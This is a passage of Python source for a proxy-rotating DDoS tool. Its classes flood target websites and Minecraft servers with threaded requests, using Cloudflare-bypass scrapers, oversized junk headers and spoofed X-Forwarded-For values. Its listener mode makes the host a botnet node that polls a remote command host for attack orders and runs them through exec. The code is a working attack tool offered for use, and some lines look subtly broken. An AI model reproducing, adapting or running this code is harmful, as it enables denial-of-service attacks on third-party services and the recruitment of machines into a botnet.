                    requests.get(url+''.join(f'?page={base64.b64encode(hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()).decode() * 35}' if str(url).endswith('/') else f'/?page={base64.b64encode(hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()).decode() * 35}'), proxies=proxy, headers=headers) if not no_proxies else requests.get(url+''.join(f'?page={base64.b64encode(hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()).decode() * 35}' if str(url).endswith('/') else f'/?page={base64.b64encode(hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(6000, 12000))).encode()).digest()).decode() * 35}'), headers=headers)
                    requests.get(url, proxies=proxy, headers=headers) if not no_proxies else requests.get(url, headers=headers)
                except Exception as e:
                    print(e)
                    pass
        def start(self):
            return self.Attack()

    class PXCHARGE:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, delay=10, captcha={'provider': 'return_response'})

        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXCHARGE, args=(self.url, until)).start()

        def AttackPXCHARGE(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    proxy = {
                        'http': 'http://'+str(random.choice(self.proxy)),
                        'https': 'http://'+str(random.choice(self.proxy)),
                    }
                    self.scraper.get(url, proxies=proxy, headers=headers) if not no_proxies else self.scraper.get(url, headers=headers)
                    requests.get(url, proxies=proxy, headers=headers, timeout=30) if not no_proxies else requests.get(url, headers=headers, timeout=30)
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXSUCCUBUS:
        def __init__(self, url, thread, time, proxy):
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.url = url
            self.thread = thread
            self.time = time
            self.scraper = cloudscraper.create_scraper(disableCloudflareV1=True, delay=10, captcha={'provider': 'return_response'})

        def Attack(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for _ in range(int(self.thread)):
                threading.Thread(target=self.AttackPXSUCCUBUS, args=(self.url, until)).start()

        def AttackPXSUCCUBUS(self, url, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                headers = {
                    'User-Agent': UserAgent().chrome,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'X-Forwaded-For': ''.join(base64.b64encode(
                        hashlib.sha256(('BBBBBBBBBBBBBBBBBBBBB' + str(random.randint(9600, 23000))).encode()).digest()
                    ).decode() * 16384),
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'TE': 'trailers',
                }
                try:
                    proxy = {
                        'http': 'http://'+str(random.choice(self.proxy)),
                        'https': 'http://'+str(random.choice(self.proxy)),
                    }
                    self.scraper.get(url, proxies=proxy, headers=headers) if not no_proxies else self.scraper.get(url, headers=headers)
                    requests.get(url, proxies=proxy, headers=headers, timeout=30) if not no_proxies else requests.get(url, headers=headers, timeout=30)
                except Exception as e:
                    print(e)
                    pass

        def start(self):
            return self.Attack()

    class PXDOZEN:
        def __init__(self, url, thread, time, proxy):
            self.url = url
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.thread = thread
            self.time = time

        def attack(self, until_datetime):
            target = clean_url(self.url)
            port = 80
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                try:
                    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.s.connect((target, port))
                    self.s.sendto(("GET / HTTP/1.1\r\nHost: " + target + "\r\nX-Forwarded-For: " + fake_ip + "\r\n\r\n").encode(), (target, port))
                    self.s.close()
                except:
                    pass
        def Run(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for i in range(int(self.thread)):
                thread = threading.Thread(target=self.attack, args=(until,))
                thread.start()
        def start(self):
            return self.Run()

    class PXDEADMC():
        def __init__(self, url, thread, time, proxy):
            self.url = url
            self.proxy = open(proxy, 'r').readlines() if not listener else proxy
            self.thread = thread
            self.time = time
            self.protocolid = 74
            self.socket = socket.create_connection(socket.AF_INET, socket.SOCK_STREAM).setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        def Attack(self, until_datetime):
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                handshake = Minecraft.handshake(self.url, self.protocolid, 1)
                packet=Minecraft.data(b'\x00')
                try:
                    solver.sendto(self.socket, handshake, (self.url.split(':')[0], self.url.split(':')[1]))
                    solver.sendto(self.socket, packet, (self.url.split(':')[0], self.url.split(':')[1]))
                except Exception as e:
                    print(e)

        def Run(self):
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(self.time))
            for i in range(int(self.thread)):
                thread = threading.Thread(target=self.Attack, args=(until,))
                thread.start()
        def start(self):
            return self.Run()

class Runner:
    def __init__(self, args):
        self.args = args
    def start():
        with ThreadPoolExecutor(max_workers=int(args.tpe)) as executor:
            exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}, "{args.proxy}").start())') if 'PX' in str(args.method).upper() else exec(f'executor.submit(Method.{str(args.method).upper()}("{args.url}", {args.thread}, {args.time}).start())')

class ListenerCommand:
    def __init__(self):
        self.url = botnet_command

    def start():
        print("[+] Waiting for commands")
        while True:
            try:
                try:
                    response = requests.get(botnet_command)
                    command_data = response.json()
                except:
                    command_data = {"command": []}
                    pass

                tx.sleep(1)
                for cmd in command_data["command"]:
                    method = cmd['execute']
                    thread = cmd['thread']
                    time = cmd['time']
                    tpe = cmd['tpe']
                    raw_proxy = str(cmd['proxy']).split(',')
                    proxy = [proxy for proxy in raw_proxy if proxy.strip() != '']
                    url = cmd['url']
                    request_id = cmd["request-id"]
                    print(f"[!] Command received!:\n[~] URL: {url}\n[~] Thread: {thread}\n[~] Time: {time}\n[~] TPE: {tpe}\n[~] Method: {method}\n[~] Request-ID: {request_id}")
                    raws = '\n'.join(i for i in proxy)
                    print(f"[~] Proxy: \n{raws[:100]}")
                    print(f"[~] Raw Proxy: \n{str(proxy)[:100]}")
                    response = requests.post(accept_command, json={"request-id": request_id}).json()
                    if response['status'] == 'Command with request-id removed':
                        print(f"\n[~] Request-ID: {request_id} accepted")
                        with ThreadPoolExecutor(max_workers=int(tpe)) as executor:
                            try:
                                print("[~] Executing..")
                                exec(f'executor.submit(Method.{str(method).upper()}("{url}", {thread}, {time}, {proxy}).start())')
                            except KeyboardInterrupt:
                                print("[!] Skipped. Continue monitoring..")
                                continue
                        print("[~] Executed!. ")
                    else:
                        print(f"[~] Error: {response}")
                        break
            except KeyboardInterrupt:
                exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=f'Usage: python3 {__file__} [OPTIONS]')
    parser.add_argument('-u', '--url', type=str, help='Target URL', metavar='https://example.com')
    parser.add_argument('-th', '--thread', type=str, help='Threader', metavar='20000', default=20000)
    parser.add_argument('-t', '--time',type=str, help='DDoS duration', metavar='45', default=45)
    parser.add_argument('-p', '--proxy', type=str, help='Proxy address', metavar='proxy.txt')
    parser.add_argument('-tpe', '--tpe', type=str, help='ThreadPoolExecutor', metavar='150-300', default=150)
    parser.add_argument('-m', '--method', type=str, help='DDoS method', metavar='PXHTTP2, [Content Deleted], PXCFB, PXREQ, PXBYP, PXROCKET, PXMIX, PXCFPRO, PXKILL, PXSOC, PXMELTED, PXFUCK, PXCHARGE, PXDOZEN, PXDEADMC')
    parser.add_argument('--listener', action='store_true', help='Become botnet')
    parser.add_argument('--no-proxy', action='store_true', help='Without using proxy')
    args = parser.parse_args()
    if not args.listener:
        if args.proxy:
            if exists(args.proxy):
                no_proxies=False
                listener = False
                threading.Thread(target=Runner.start()).start() if args.method in ['PXHTTP2', 'PXCFB', 'PXREQ', 'PXBYP', 'PXROCKET', 'PXMIX', 'PXCFPRO', 'PXKILL', 'PXSOC', 'PXMELTED', 'PXFUCK', 'PXCHARGE', 'PXSUCCUBUS', 'PXDOZEN', 'PXDEADMC'] else print(f"No method: {args.method}"); exit(1)
            else:
                print(f"No proxy file: {args.proxy}")
                exit(1)
        elif args.no_proxy:
            no_proxies=True
            listener = False
            threading.Thread(target=Runner.start()).start() if args.method in ['PXHTTP2', 'PXCFB', 'PXREQ', 'PXBYP', 'PXROCKET', 'PXMIX', 'PXCFPRO', 'PXKILL', 'PXSOC', 'PXMELTED', 'PXFUCK', 'PXCHARGE', 'PXSUCCUBUS', 'PXDOZEN', 'PXDEADMC'] else print(f"No method: {args.method}"); exit(1)
        else:
            parser.print_usage()
    else:
        no_proxies=False if not args.no_proxy else True
        listener = True
        botnet_command = input('[~] Command host: ')
        accept_command = input('[~] Accept host: ')
        threading.Thread(target=ListenerCommand.start()).start()
